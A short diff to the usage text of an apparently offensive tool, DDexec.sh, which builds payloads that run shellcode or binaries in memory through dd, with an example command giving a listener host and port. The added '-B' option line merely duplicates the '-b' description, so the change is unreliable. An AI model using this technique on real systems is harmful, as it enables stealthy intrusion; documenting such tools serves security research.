@@ -60,6 +60,7 @@ Arguments:
     -m Mode of memory load. By default fclose_got if dd binary not protected with full relro, if protected, retsled is forced.
     -s Shellcode to execute in hex "4831c0b002...". If msfvenom params are given, msfvenom will create a shellcode. By default a shellcode that echoes "Pwnd!" is used.
     -b Binary to load in memory. It has to be either statically linked or use the same dynamic libs as on a target machine.
+    -B Binary to load in memory. It has to be either statically linked or use the same dynamic libs as on a target machine.
 
 e.g.: DDexec.sh -o /path/to/output/payload.sh -d /path/to/dd [-l /path/to/libc] -P 4444 -H 10.10.10.10 -a x86_64 [-m <fclose_got,retsled> (default fclose_got)] [-s <shellcode_hex>]
 ```
